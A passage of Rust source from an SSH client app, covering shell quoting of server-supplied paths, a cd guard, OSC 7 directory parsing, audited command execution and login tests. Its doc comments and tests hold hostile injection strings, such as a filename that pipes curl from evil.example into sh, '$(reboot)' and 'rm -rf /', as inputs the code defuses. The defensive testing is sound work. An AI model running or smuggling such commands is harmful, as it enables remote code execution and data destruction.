        }
    }
    out
}

pub fn session(app: &AppHandle, id: &str) -> Result<Arc<Session>> {
    app.state::<Sessions>()
        .0
        .lock()
        .unwrap()
        .get(id)
        .cloned()
        .ok_or_else(|| Error::Ssh(format!("session {id} is not connected")))
}

/// Wraps a string as one POSIX shell word.
///
/// Every command this app sends is a string handed to the remote login shell,
/// so every character in it is the shell's to interpret — and the paths that go
/// into those commands come out of a directory listing the *server* controls.
/// `a'; curl evil | sh; '.txt` is a legal filename on Linux, and unquoted it is
/// not a path at all, it is a command. `scratch_name` in `sftp.rs` refuses the
/// same class of name for the same reason; this is the other half of it.
///
/// Single quotes make a POSIX shell take everything between them literally,
/// which leaves exactly one character to deal with: the quote itself, handled
/// by closing the string, escaping one, and opening it again.
pub fn quoted(word: &str) -> String {
    format!("'{}'", word.replace('\'', r"'\''"))
}

/// Types `cd <path>` at the session's interactive shell.
///
/// Through the same queue as a keystroke, so it is audited like one: the line
/// appears in `command_log` because `LineReader` reconstructs it there, exactly
/// as it would if the user had typed it. That is the honest record — this *is*
/// typing at their shell, and the pane says so.
///
/// A line break is refused rather than quoted around. The newline at the end is
/// what makes this a command instead of a suggestion, and a directory called
/// `notes\nrm -rf /` — a legal Linux name, from a listing the server controls —
/// would send two lines, the second one a command in its own right. Quoting
/// cannot help: the shell has split the input into lines before it ever looks
/// at a quote. So this refuses, the way `scratch_name` does, rather than
/// sanitising into a path that is not the one asked for.
pub fn cd(app: &AppHandle, session_id: &str, path: &str) -> Result<()> {
    let line = cd_line(path)?;
    let session = session(app, session_id)?;
    let _ = session.input.send(line.into_bytes());
    Ok(())
}

/// How a log line names this session's server.
///
/// Falls back to the id rather than to nothing: a line about a session that has
/// just gone is still a line about *something*, and an empty space where the
/// host should be reads as a bug in the logging.
pub fn label_of(app: &AppHandle, session_id: &str) -> String {
    match session(app, session_id) {
        Ok(session) => format!("host={}", session.label),
        Err(_) => format!("host=? session={session_id}"),
    }
}

/// The last directory this session's shell announced, for a pane that has just
/// been built and missed everything before it.
///
/// `None` for a session that is not connected, and for one whose shell has
/// never said — the caller cannot act differently on the two, and treating a
/// disconnected session as an error would make an ordinary mount noisy.
pub fn cwd(app: &AppHandle, session_id: &str) -> Option<String> {
    session(app, session_id).ok()?.cwd.lock().unwrap().clone()
}

/// The exact bytes typed at the shell, or the refusal. Split out so the guard
/// above it can be tested without a connection to type at.
fn cd_line(path: &str) -> Result<String> {
    if path.contains(['\n', '\r']) {
        return Err(Error::Invalid(format!(
            "refusing to cd to {path}: its name contains a line break, which would send a second \
             line to the shell. Open it in the pane instead."
        )));
    }
    Ok(format!("cd {}\n", quoted(path)))
}

/// The shell has told us which directory it is in.
#[derive(Clone, Serialize)]
#[serde(rename_all = "camelCase")]
struct CwdEvent {
    session_id: String,
    path: String,
}

/// Reassembles the one escape sequence this app reads out of the shell's own
/// output: OSC 7, which is how a shell announces the directory it is in.
///
/// Read rather than asked for, and that is the whole design. There is no way to
/// learn an interactive shell's working directory without the shell's
/// cooperation — the alternatives are typing a command into it, which lands in
/// whatever program happens to be running and may be `vim` or a password
/// prompt, or rewriting the user's `PROMPT_COMMAND` behind their back. So this
/// listens, and the pane offers the feature when the shell is announcing and
/// says how to make it announce when it is not.
///
/// A sequence arrives in as many packets as the network felt like using, and
/// the terminator is two bytes in the `ESC \` form — the split lands between
/// them often enough to matter and never in a test that feeds whole strings.
/// Hence a state machine that survives a `push` boundary anywhere.
#[derive(Default)]
pub struct CwdReader {
    state: Scan,
    body: Vec<u8>,
}

#[derive(Default, Clone, Copy)]
enum Scan {
    /// Ordinary output, looking for the `ESC` that might start one.
    #[default]
    Idle,
    /// An `ESC` has been seen; `]` would make it an OSC.
    Esc,
    /// Inside an OSC, collecting until it terminates.
    Body,
    /// Inside an OSC, and an `ESC` has been seen; `\` would end it.
    BodyEsc,
}

/// A sequence longer than this is not one a shell sent. Without a cap, a server
/// that emits `ESC ]` and never terminates grows this without bound — the same
/// reasoning as `read_small`'s limit, against the same kind of host.
const MAX_OSC: usize = 4 * 1024;

impl CwdReader {
    /// Feeds one chunk of shell output and returns a directory if one was
    /// announced in it. The last one wins: a chunk can carry several prompts.
    pub fn push(&mut self, chunk: &[u8]) -> Option<String> {
        let mut found = None;
        for &byte in chunk {
            match self.state {
                Scan::Idle => {
                    if byte == 0x1b {
                        self.state = Scan::Esc;
                    }
                }
                Scan::Esc => {
                    self.state = match byte {
                        b']' => {
                            self.body.clear();
                            Scan::Body
                        }
                        // Two escapes running: the second one is still the
                        // start of whatever comes next.
                        0x1b => Scan::Esc,
                        _ => Scan::Idle,
                    };
                }
                Scan::Body => match byte {
                    0x07 => {
                        if let Some(path) = self.finish() {
                            found = Some(path);
                        }
                    }
                    0x1b => self.state = Scan::BodyEsc,
                    _ if self.body.len() >= MAX_OSC => {
                        self.state = Scan::Idle;
                        self.body.clear();
                    }
                    _ => self.body.push(byte),
                },
                Scan::BodyEsc => match byte {
                    b'\\' => {
                        if let Some(path) = self.finish() {
                            found = Some(path);
                        }
                    }
                    0x1b => {}
                    // An `ESC` inside the body that did not terminate it. This
                    // is not a sequence we can make sense of, so it is dropped
                    // rather than guessed at.
                    _ => {
                        self.state = Scan::Idle;
                        self.body.clear();
                    }
                },
            }
        }
        found
    }

    fn finish(&mut self) -> Option<String> {
        let body = std::mem::take(&mut self.body);
        self.state = Scan::Idle;
        // `7;` is the command number. Every other OSC — the window title at
        // `0;`, the palette at `4;` — goes past untouched.
        directory(String::from_utf8_lossy(&body).strip_prefix("7;")?)
    }
}

/// The directory out of an OSC 7 payload.
///
/// The sequence carries a URL, not a path — `file://myhost/var/log` — and real
/// emitters percent-encode it: fish and starship send `/tmp/my%20app` for a
/// directory with a space in its name. Handed to `sftp_list` unchanged that
/// opens nothing and reports "no such directory", which sends the user looking
/// for a problem that is not there.
///
/// So the `file://` form is decoded and a bare path is not — the encoding is a
/// property of the URL, and a hook written by hand sends the path as it is. The
/// distinction is what keeps `/tmp/100%done` intact from the one and
/// `/tmp/my%20app` readable from the other.
///
/// It leaves one ambiguity, and it is the right one to leave: a directory
/// genuinely named `a%20b`, announced by an emitter that does not encode, reads
/// back as `a b`. That is a wrong answer to a question nobody asks; the
/// alternative is a wrong answer to the ordinary case of a space in a name.
fn directory(payload: &str) -> Option<String> {
    let path = match payload.strip_prefix("file://") {
        // Everything up to the next `/` is the authority — a hostname, or
        // nothing at all in the `file:///var/log` form, which is what a shell
        // with no `$HOSTNAME` set sends and is just as common.
        Some(after) => return absolute(&percent_decode(&after[after.find('/')?..])),
        None => payload,
    };
    absolute(path)
}

/// Anything that is not an absolute path is not something to hand a file pane.
fn absolute(path: &str) -> Option<String> {
    path.starts_with('/').then(|| path.to_string())
}

fn percent_decode(text: &str) -> String {
    let bytes = text.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        // A trailing `%` or one followed by anything that is not two hex digits
        // is a literal `%` — which is a legal character in a filename, and more
        // likely than a hook that encodes badly.
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let Some(byte) = hex(bytes[i + 1]).zip(hex(bytes[i + 2])).map(|(h, l)| h << 4 | l) {
                out.push(byte);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn hex(byte: u8) -> Option<u8> {
    match byte {
        b'0'..=b'9' => Some(byte - b'0'),
        b'a'..=b'f' => Some(byte - b'a' + 10),
        b'A'..=b'F' => Some(byte - b'A' + 10),
        _ => None,
    }
}

/// What one non-interactive command left behind.
pub struct Output {
    pub status: u32,
    pub stdout: Vec<u8>,
    /// Decoded lossily: this is read by people and matched against a program's
    /// own wording, and one stray byte must not lose the sentence around it.
    pub stderr: String,
}

/// How much of a command's diagnostics is worth keeping. A program that decides
/// to write a megabyte to stderr is not writing anything anybody will read.
const STDERR_LIMIT: usize = 8 * 1024;

/// A command that has not finished by now is not going to. Nothing here is
/// interactive — a program still waiting has run out of input that is coming.
const RUN_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(60);

/// Runs one command on the session's connection and waits for it to finish.
///
/// A channel of its own, and deliberately **without a PTY**. Both halves
/// matter. The interactive shell's channel is the one `LineReader` reconstructs
/// into audit rows, so anything sent there is written down — which is exactly
/// what a password must not be. And a PTY would make a program that reads a
/// secret take it from the terminal rather than stdin, and echo it straight
/// back as channel data.
///
/// `stdin` is sent and then closed. The close is not optional: a program
/// reading standard input waits for the end of it, and one that never comes is
/// a channel that never returns.
///
/// `limit` caps what is kept from stdout. The output of a command run by the
/// app arrives in memory whole, and the size of it is the server's choice.
pub async fn run(
    app: &AppHandle,
    session_id: &str,
    command: &str,
    stdin: Option<&[u8]>,
    limit: usize,
    origin: Origin,
) -> Result<Output> {
    let outcome = running(app, session_id, command, stdin, limit).await;
    // Whichever way it went. A command that failed is the one somebody comes
    // looking for later, and a trail that only records the successes is not a
    // trail — it is a highlight reel.
    audited(app, session_id, origin, command, &outcome);
    outcome
}

/// Writes one exec to both places a record of it belongs.
///
/// The audit row answers *what was done to this server*, kept as long as the
/// host exists; the log line answers *what this program did just now*, which is
/// what the log window shows. Neither is optional here: running a command on
/// somebody's machine is the most consequential thing this app does, and it is
/// the one thing that must never happen without a trace.
///
/// At `info` rather than the `debug` an SFTP operation gets. A listing is a
/// read of one directory over a protocol that can do nothing else; this is an
/// arbitrary command line, very often as root, and it belongs in the ordinary
/// narrative rather than behind a level that is off by default.
///
/// **The command is written down and the input never is.** A password reaches
/// `sudo` on stdin precisely so that it is in no command string — see
/// `sudo::with_password` — which is what makes this line safe to write and
/// keeps the promise at the top of `logging.rs` intact.
fn audited(app: &AppHandle, session_id: &str, origin: Origin, command: &str, outcome: &Result<Output>) {
    let (detail, exit) = match outcome {
        Ok(out) if out.status == 0 => (None, Some(0)),
        // The server's own words for why, which is the whole value of the row.
        Ok(out) => (Some(out.stderr.clone()), Some(out.status as i32)),
        // No status at all: it never got far enough to have one.
        Err(e) => (Some(e.to_string()), None),
    };

    let outcome_text = match exit {
        Some(0) => "ok".to_string(),
        Some(status) => format!("exit={status}"),
        None => "did not run".to_string(),
    };
    let note = match &detail {
        Some(text) if !text.is_empty() => format!("{outcome_text} · {text}"),
        _ => outcome_text,
    };
    logging::record(
        if matches!(exit, Some(0)) { Level::Info } else { Level::Warn },
        "ssh",
        &format!("ran {command}"),
        Some(&format!("{} session={session_id} {note}", label_of(app, session_id))),
    );

    // A session that has gone means there is no host to file this against. The
    // log line above still went out, so the fact is not lost.
    let Ok(session) = session(app, session_id) else { return };
    let db = app.state::<Db>();
    let conn = db.0.lock().unwrap();
    audit::record(
        &conn,
        session.host_id,
        Some(session_id),
        origin,
        Kind::Exec,
        command,
        detail.as_deref(),
        exit,
    );
}

async fn running(
    app: &AppHandle,
    session_id: &str,
    command: &str,
    stdin: Option<&[u8]>,
    limit: usize,
) -> Result<Output> {
    let session = session(app, session_id)?;
    let mut channel = session
        .handle
        .channel_open_session()
        .await
        .map_err(|e| Error::Ssh(format!("could not open a channel: {e}")))?;
    channel
        .exec(true, command)
        .await
        .map_err(|e| Error::Ssh(format!("the server refused to run a command: {e}")))?;

    if let Some(bytes) = stdin {
        channel
            .data(bytes)
            .await
            .map_err(|e| Error::Ssh(format!("could not write to the command: {e}")))?;
    }
    let _ = channel.eof().await;

    let mut status = 0u32;
    let mut stdout: Vec<u8> = Vec::new();
    let mut stderr: Vec<u8> = Vec::new();
    let collecting = async {
        while let Some(message) = channel.wait().await {
            match message {
                ChannelMsg::Data { data } => take(&mut stdout, &data, limit),
                ChannelMsg::ExtendedData { data, .. } => take(&mut stderr, &data, STDERR_LIMIT),
                ChannelMsg::ExitStatus { exit_status } => status = exit_status,
                // A command killed by a signal reports no exit status at all,
                // and a zero left over from the initialiser would read as
                // success. 128 + n is the shell's own convention for it.
                ChannelMsg::ExitSignal { signal_name, .. } => {
                    status = 128 + signal_number(&signal_name);
                }
                ChannelMsg::Close => break,
                _ => {}
            }
        }
    };
    tokio::time::timeout(RUN_TIMEOUT, collecting)
        .await
        .map_err(|_| Error::Ssh(format!("the server did not finish running the command in {}s", RUN_TIMEOUT.as_secs())))?;

    Ok(Output {
        status,
        stdout,
        stderr: String::from_utf8_lossy(&stderr).trim().to_string(),
    })
}

/// Appends what still fits and silently drops the rest — the cap is a memory
/// bound, not a protocol error, and a truncated tail is better than a refusal.
fn take(into: &mut Vec<u8>, data: &[u8], limit: usize) {
    let room = limit.saturating_sub(into.len());
    if room > 0 {
        into.extend_from_slice(&data[..data.len().min(room)]);
    }
}

/// The numbers behind the names SSH sends. Only the ones a command actually
/// dies of; anything else lands on 0, which still leaves the status non-zero
/// and the failure visible.
fn signal_number(signal: &russh::Sig) -> u32 {
    use russh::Sig;
    match signal {
        Sig::HUP => 1,
        Sig::INT => 2,
        Sig::QUIT => 3,
        Sig::ILL => 4,
        Sig::ABRT => 6,
        Sig::FPE => 8,
        Sig::KILL => 9,
        Sig::SEGV => 11,
        Sig::PIPE => 13,
        Sig::ALRM => 14,
        Sig::TERM => 15,
        _ => 0,
    }
}

pub async fn disconnect(app: &AppHandle, id: &str) -> Result<()> {
    // Before anything that can fail or return early. A sudo password outliving
    // the connection it was given for is a secret kept for no reason, and the
    // session it belonged to is about to stop existing.
    crate::sudo::forget(app, id);

    let session = app.state::<Sessions>().0.lock().unwrap().remove(id);
    if let Some(session) = session {
        {
            let db = app.state::<Db>();
            let conn = db.0.lock().unwrap();
            audit::record(
                &conn,
                session.host_id,
                Some(id),
                Origin::User,
                Kind::Auth,
                "disconnect",
                None,
                None,
            );
        }
        let _ = session
            .handle
            .disconnect(Disconnect::ByApplication, "", "en")
            .await;
        logging::info(
            "ssh",
            "disconnected",
            Some(&format!(
                "session={id} host={} up={}s",
                session.host_id,
                (crate::db::now_ms() - session.started_at) / 1000
            )),
        );
    }
    Ok(())
}

/// Every session a window owns — used when that window closes.
pub fn sessions_of_window(app: &AppHandle, label: &str) -> Vec<String> {
    let sessions = app.state::<Sessions>();
    let map = sessions.0.lock().unwrap();
    map.values()
        .filter(|s| s.window == label)
        .map(|s| s.id.clone())
        .collect()
}

/// The password exchange, against a server that actually answers.
///
/// Everything here is about one question: what a server will *say* when it
/// offers password login, and whether this client survives each shape of it.
/// The interesting one is a host with `PasswordAuthentication no` and
/// `KbdInteractiveAuthentication yes` — the configuration a user reads as
/// "password login works, and this app is the only client that cannot do it".
#[cfg(test)]
mod tests {
    use super::*;
    use russh::keys::ssh_key::rand_core::OsRng;
    use russh::keys::{Algorithm, PrivateKey};

    /// An ordinary path comes out as itself, wrapped.
    #[test]
    fn wraps_an_ordinary_path() {
        assert_eq!(quoted("/etc/nginx/nginx.conf"), "'/etc/nginx/nginx.conf'");
        assert_eq!(quoted("/home/opc/a file.txt"), "'/home/opc/a file.txt'");
    }

    /// The names a server would choose if it wanted a command of its own run on
    /// the far end. Every one of them is a legal filename on Linux, and every
    /// one of them is inert once it is one shell word.
    #[test]
    fn defuses_a_name_that_is_a_command() {
        for hostile in [
            "/tmp/a'; curl evil.example/x | sh; '.txt",
            "/tmp/$(reboot)",
            "/tmp/`reboot`",
            "/tmp/x; rm -rf /",
            "/tmp/x && rm -rf /",
            "/tmp/*",
            "/tmp/~root/.ssh/authorized_keys",
        ] {
            let word = quoted(hostile);
            // Opens and closes, and every quote inside is an escaped one rather
            // than a way out of the string.
            assert!(word.starts_with('\'') && word.ends_with('\''), "{hostile:?} → {word}");
            let inside = &word[1..word.len() - 1];
            assert!(!inside.split(r"'\''").any(|part| part.contains('\'')), "{hostile:?} → {word}");
        }
    }

    /// The one character that needs work, on its own and doubled.
    #[test]
    fn escapes_the_quote_itself() {
        assert_eq!(quoted("it's"), r"'it'\''s'");
        assert_eq!(quoted("''"), r"''\'''\'''");
    }

    /// One line, and one command. A path is quoted; a path with a line break in
    /// it is refused, because the newline that ends the command is the one
    /// thing quoting cannot contain — the shell has already split the input
    /// into lines before it looks at a quote.
    #[test]
    fn types_one_line_at_the_shell() {
        assert_eq!(cd_line("/var/log").unwrap(), "cd '/var/log'\n");
        assert_eq!(cd_line("/tmp/a b").unwrap(), "cd '/tmp/a b'\n");
        assert_eq!(cd_line("/tmp/it's").unwrap(), "cd '/tmp/it'\\''s'\n");

        for hostile in ["/tmp/notes\nrm -rf /", "/tmp/notes\rrm -rf /", "/tmp/a\n"] {
            let refused = cd_line(hostile).unwrap_err().to_string();
            assert!(refused.contains("refusing to cd"), "{hostile:?} → {refused}");
        }
        // And nothing that is allowed through can be more than one line.
        for ok in ["/var/log", "/tmp/a b", "/tmp/$(reboot)", "/tmp/x; rm -rf /"] {
            assert_eq!(cd_line(ok).unwrap().lines().count(), 1, "{ok:?}");
        }
    }

    /// The payload is a URL, and real emitters encode it. A directory with a
    /// space in its name is the ordinary case that a naive parser opens nothing
    /// for and then blames on the server.
    #[test]
    fn reads_the_url_an_osc_7_carries() {
        let read = |body: &str| CwdReader::default().push(format!("\x1b]{body}\x07").as_bytes());

        assert_eq!(read("7;file://myhost/var/log").as_deref(), Some("/var/log"));
        // No authority at all, which is just as common as a hostname.
        assert_eq!(read("7;file:///var/log").as_deref(), Some("/var/log"));
        assert_eq!(read("7;file://myhost/tmp/my%20app").as_deref(), Some("/tmp/my app"));
        assert_eq!(read("7;file://h/srv/caf%C3%A9").as_deref(), Some("/srv/café"));
        // A hook written by hand very often sends the path alone — and it sends
        // it *as it is*, so nothing in it is decoded.
        assert_eq!(read("7;/var/log").as_deref(), Some("/var/log"));
        assert_eq!(read("7;/tmp/my app").as_deref(), Some("/tmp/my app"));
        assert_eq!(read("7;/tmp/100%done").as_deref(), Some("/tmp/100%done"));
        assert_eq!(read("7;/tmp/a%20b").as_deref(), Some("/tmp/a%20b"));
        // A `%` in a URL that does not begin an escape is a literal one.
        assert_eq!(read("7;file://h/tmp/100%done").as_deref(), Some("/tmp/100%done"));
    }

    /// Captured from the hook this app offers, run under each shell. The zsh
    /// line is the empty-authority form, because zsh does not set `$HOSTNAME`.
    #[test]
    fn reads_what_the_offered_hook_actually_emits() {
        let mut reader = CwdReader::default();
        assert_eq!(
            reader.push(b"\x1b]7;file://192.168.36.6/tmp/scratchpad/my app\x07").as_deref(),
            Some("/tmp/scratchpad/my app"),
        );
        assert_eq!(
            reader.push(b"\x1b]7;file:///tmp/scratchpad/my app\x07").as_deref(),
            Some("/tmp/scratchpad/my app"),
        );
        // The hook shares a line with whatever prompt command was already
        // there, so its output shares a chunk with that command's.
        assert_eq!(
            reader.push(b"\x1b]7;file://h/var/log\x07already-here\r\n").as_deref(),
            Some("/var/log"),
        );
    }

    /// Every other OSC goes past untouched — the window title in particular,
    /// which every shell sets and which is not a directory.
    #[test]
    fn ignores_every_other_sequence() {
        let read = |body: &str| CwdReader::default().push(body.as_bytes());

        assert_eq!(read("\x1b]0;opc@host: ~\x07"), None);
        assert_eq!(read("\x1b]4;1;#ff0000\x07"), None);
        // Relative, so not something to hand a file pane.
        assert_eq!(read("\x1b]7;file://host/../etc\x07").as_deref(), Some("/../etc"));
        assert_eq!(read("\x1b]7;notaurl\x07"), None);
        assert_eq!(read("ordinary output, no escapes at all\n"), None);
        assert_eq!(read("\x1b[32mcolour, which is CSI and not OSC\x1b[0m"), None);
    }

    /// The terminator is `BEL` or `ESC \`, and the two-byte one splits across
    /// packets often enough to matter. This is the bug that reproduces once a
    /// week and never in a test that feeds whole strings.
    #[test]
    fn survives_a_split_anywhere_in_the_sequence() {
        let whole = b"prompt\x1b]7;file://host/var/log\x1b\\$ ";
        for cut in 1..whole.len() {
            let mut reader = CwdReader::default();
            let first = reader.push(&whole[..cut]);
            let second = reader.push(&whole[cut..]);
            assert_eq!(
                first.or(second).as_deref(),
                Some("/var/log"),
                "split at {cut}"
            );
        }
    }

    /// A chunk can carry several prompts, and the one that counts is where the
    /// shell is *now*.
    #[test]
    fn keeps_the_last_directory_announced() {
        let mut reader = CwdReader::default();
        let found = reader.push(b"\x1b]7;/one\x07 out \x1b]7;/two\x07 more \x1b]7;/three\x07");
        assert_eq!(found.as_deref(), Some("/three"));
    }

    /// A server that opens a sequence and never closes it must not be able to
    /// grow the buffer without bound.
    #[test]
    fn gives_up_on_a_sequence_that_never_ends() {
        let mut reader = CwdReader::default();
        for _ in 0..64 {
            assert_eq!(reader.push(&[b'x'; 1024]), None);
        }
        assert!(reader.body.len() <= MAX_OSC);
        // And it recovers: the next real one still reads.
        assert_eq!(reader.push(b"\x07\x1b]7;/var\x07").as_deref(), Some("/var"));
    }
    use russh::server::{self, Auth, Server as _};
    use std::borrow::Cow;

    const PASSWORD: &str = "correct horse battery staple";

    /// What the test server will accept, whatever it advertises.
    #[derive(Clone, Copy, PartialEq)]
    enum Accepts {
        Password,
        KeyboardInteractive,
        /// A PAM stack that runs its one-time-code module first: the opening
        /// question is not the password, and nothing here can answer it.
        SecondFactorFirst,
        /// A PAM stack with `retry` set: a wrong password is asked for again
        /// rather than refused outright.
        AnotherGo,
        /// Neither — a server that offers password login and turns down the
        /// password.
        Nothing,
    }

    #[derive(Clone)]
    struct Sshd {
        accepts: Accepts,
        /// Whether this connection has been shown the password prompt yet.
        /// The exchange opens with a promptless round, the way a PAM stack
        /// sends its banner before it asks anything.
        asked: bool,
        /// Set if the account password is ever received. The point of the
        /// second-factor case is that it never is.
        saw_password: Arc<std::sync::atomic::AtomicBool>,
    }

    fn prompt(text: &'static str) -> Cow<'static, [(Cow<'static, str>, bool)]> {
        Cow::Owned(vec![(text.into(), false)])
    }

    impl server::Server for Sshd {
        type Handler = Self;
        fn new_client(&mut self, _: Option<std::net::SocketAddr>) -> Self {
            self.clone()
        }
    }

    impl server::Handler for Sshd {
        type Error = russh::Error;

        async fn auth_password(
            &mut self,
            _user: &str,
            password: &str,
        ) -> std::result::Result<Auth, Self::Error> {
            Ok(if self.accepts == Accepts::Password && password == PASSWORD {
                Auth::Accept
            } else {
                Auth::reject()
            })
        }

        async fn auth_keyboard_interactive<'a>(
            &'a mut self,
            _user: &str,
            _submethods: &str,
            response: Option<server::Response<'a>>,
        ) -> std::result::Result<Auth, Self::Error> {
            let asking = |text: &'static str| Auth::Partial {
                name: "".into(),
                instructions: "".into(),
                prompts: prompt(text),
            };

            let mut answers = match response {
                // Opening round: a banner and nothing to answer, which is how
                // a PAM stack commonly starts.
                None => {
                    return Ok(match self.accepts {
                        Accepts::KeyboardInteractive => Auth::Partial {
                            name: "".into(),
                            instructions: "Portway test server".into(),
                            prompts: Cow::Owned(Vec::new()),
                        },
                        Accepts::SecondFactorFirst => asking("Verification code: "),
                        Accepts::AnotherGo => asking("Password: "),
                        _ => Auth::reject(),
                    })
                }
                Some(answers) => answers,
            };

            let given = answers.next();
            if given.as_deref() == Some(PASSWORD.as_bytes()) {
                self.saw_password.store(true, std::sync::atomic::Ordering::SeqCst);
            }

            match self.accepts {
                Accepts::KeyboardInteractive => {
                    if !self.asked {
                        self.asked = true;
                        return Ok(asking("Password: "));
                    }
                    Ok(match given {
                        Some(given) if given == PASSWORD.as_bytes() => Auth::Accept,
                        _ => Auth::reject(),
                    })
                }
                // Asks the same thing again rather than refusing, however many
                // times it is answered.
                Accepts::AnotherGo => Ok(asking("Password: ")),
                _ => Ok(Auth::reject()),
            }
        }
    }

    /// `check_server_key` writes down a host it has not met, and every test
    /// here meets one. Point HOME at a scratch directory so that lands in a
    /// temporary file, and refuse to run at all if the redirect did not take —
    /// the alternative is appending to the known_hosts of whoever ran `cargo
    /// test`.
    fn scratch_home() {
        static ONCE: std::sync::Once = std::sync::Once::new();
        ONCE.call_once(|| {
            // Named for this process: two `cargo test` runs at once would
            // otherwise share one known_hosts and one of them would clear it
            // out from under the other.
            let dir = std::env::temp_dir().join(format!("portway-ssh-tests-{}", std::process::id()));
            std::fs::create_dir_all(dir.join(".ssh")).unwrap();
            // Entries are keyed by host *and port*, and the port is a new one
            // every run, so the file would only ever grow.
            let _ = std::fs::remove_file(dir.join(".ssh").join("known_hosts"));
            std::env::set_var("HOME", &dir);
        });
        assert!(
            known_hosts_path().starts_with(std::env::temp_dir()),
            "the tests must not be able to touch a real known_hosts"
        );
    }

    fn host() -> Host {
        Host {
            id: 1,
            name: "test".into(),
            address: "127.0.0.1".into(),
            port: 0,
            user: "portway".into(),
            group: "dev".into(),
            auth: "password".into(),
            key_path: None,
            jump_host: None,
            run_on_connect: None,
            agent_forwarding: false,
            keep_alive: false,
            save_to_keychain: true,
            unlock_via_keychain: false,
            favorite: false,
            tags: Vec::new(),
            last_used_at: None,
            created_at: 0,
            updated_at: 0,
        }
    }

    /// Runs the server on a loopback port and connects to it exactly as `dial`
    /// does — same handler, same host-key policy — stopping short of auth.
    /// The handle, and the flag that says whether the server ever received the
    /// account password.
    async fn connected(
        accepts: Accepts,
        advertises: &[MethodKind],
    ) -> (Handle<ClientHandler>, Arc<std::sync::atomic::AtomicBool>) {
        scratch_home();
        let listener = tokio::net::TcpListener::bind(("127.0.0.1", 0)).await.unwrap();
        let port = listener.local_addr().unwrap().port();

        let config = Arc::new(server::Config {
            methods: advertises.into(),
            keys: vec![PrivateKey::random(&mut OsRng, Algorithm::Ed25519).unwrap()],
            // A rejection this server makes is not a security event worth
            // slowing a test suite down for.
            auth_rejection_time: std::time::Duration::ZERO,
            auth_rejection_time_initial: Some(std::time::Duration::ZERO),
            ..Default::default()
        });
        let saw_password = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let mut sshd = Sshd { accepts, asked: false, saw_password: saw_password.clone() };
        tokio::spawn(async move { sshd.run_on_socket(config, &listener).await });

        let handler = ClientHandler {
            server_key: Arc::new(Mutex::new(String::new())),
            verdict: Arc::new(Mutex::new(String::new())),
            known_hosts: KnownHostsPolicy { host: "127.0.0.1".into(), port, strict: false },
            forward_to: None,
        };
        let handle =
            client::connect(Arc::new(client::Config::default()), ("127.0.0.1", port), handler)
                .await
                .expect("the test server completes a handshake");
        (handle, saw_password)
    }

    #[tokio::test]
    async fn logs_in_with_the_password_method() {
        let (mut handle, _) = connected(Accepts::Password, &[MethodKind::Password]).await;
        let method = password_auth(&mut handle, &host(), PASSWORD).await.expect("logs in");
        assert_eq!(method, "password");
    }

    /// The configuration this was written for: the server lists `password`,
    /// turns one down anyway, and means `keyboard-interactive`.
    #[tokio::test]
    async fn falls_back_to_keyboard_interactive() {
        let (mut handle, _) = connected(
            Accepts::KeyboardInteractive,
            &[MethodKind::Password, MethodKind::KeyboardInteractive],
        )
        .await;
        let method = password_auth(&mut handle, &host(), PASSWORD).await.expect("logs in");
        // Reported as what it was, not as what the host was set to: the audit
        // trail says which of the two methods the server actually took.
        assert_eq!(method, "keyboard-interactive");
    }

    /// And the same server with `PasswordAuthentication no`, which does not
    /// list `password` at all — nothing to fall back *from*.
    #[tokio::test]
    async fn logs_in_where_only_keyboard_interactive_is_offered() {
        let (mut handle, _) =
            connected(Accepts::KeyboardInteractive, &[MethodKind::KeyboardInteractive]).await;
        password_auth(&mut handle, &host(), PASSWORD).await.expect("logs in");
    }

    /// A wrong password has to read as a wrong password. This is the case that
    /// sends somebody to the server's logs if the message is vague.
    #[tokio::test]
    async fn says_so_when_the_password_is_wrong() {
        let (mut handle, _) = connected(Accepts::Nothing, &[MethodKind::Password]).await;
        let error = password_auth(&mut handle, &host(), "wrong").await.unwrap_err().to_string();
        assert!(error.contains("rejected the password"), "{error}");
    }

    /// The same verdict when the refusal arrives as another prompt instead of a
    /// failure — `pam_unix` with `retry` asks again rather than giving up, and
    /// answering that with "this host needs an interactive login" would send
    /// somebody looking for a second factor that is not there.
    #[tokio::test]
    async fn a_repeated_prompt_is_a_refusal_not_a_second_factor() {
        let (mut handle, _) = connected(Accepts::AnotherGo, &[MethodKind::KeyboardInteractive]).await;
        let error = password_auth(&mut handle, &host(), "wrong").await.unwrap_err().to_string();
        assert!(error.contains("rejected the password"), "{error}");
    }

    /// A stack that asks for the one-time code first. The password must not be
    /// typed into that box: it cannot answer the question, and it would reach
    /// the server as the answer to a different one.
    #[tokio::test]
    async fn never_answers_a_second_factor_with_the_password() {
        let (mut handle, saw_password) =
            connected(Accepts::SecondFactorFirst, &[MethodKind::KeyboardInteractive]).await;
        let error = password_auth(&mut handle, &host(), PASSWORD).await.unwrap_err().to_string();
        assert!(error.contains("cannot answer"), "{error}");
        // Quoted back so the message names what was actually asked.
        assert!(error.contains("Verification code"), "{error}");
        assert!(
            !saw_password.load(std::sync::atomic::Ordering::SeqCst),
            "the password reached the server as the answer to the code prompt"
        );
    }

    /// A server that will not take a password at all is not the same failure,
    /// and pointing at the password would be the wrong advice.
    #[tokio::test]
    async fn distinguishes_a_server_that_offers_no_password_login() {
        let (mut handle, _) = connected(Accepts::Nothing, &[MethodKind::PublicKey]).await;
        let error = password_auth(&mut handle, &host(), PASSWORD).await.unwrap_err().to_string();
        assert!(error.contains("does not offer password login"), "{error}");
        assert!(error.contains("publickey"), "{error}");
    }

    /// Prompt text decides where the password goes, so the two kinds have to
    /// stay apart — including the ones that are not the English word.
    #[test]
    fn tells_a_code_prompt_from_a_password_prompt() {
        for asks in ["Verification code: ", "One-time password: ", "Duo passcode: ", "OTP:"] {
            assert!(asks_for_a_second_factor(asks), "{asks}");
        }
        for asks in ["Password: ", "Mot de passe : ", "Passwort:", "密码：", "Contraseña:"] {
            assert!(!asks_for_a_second_factor(asks), "{asks}");
        }
    }
}
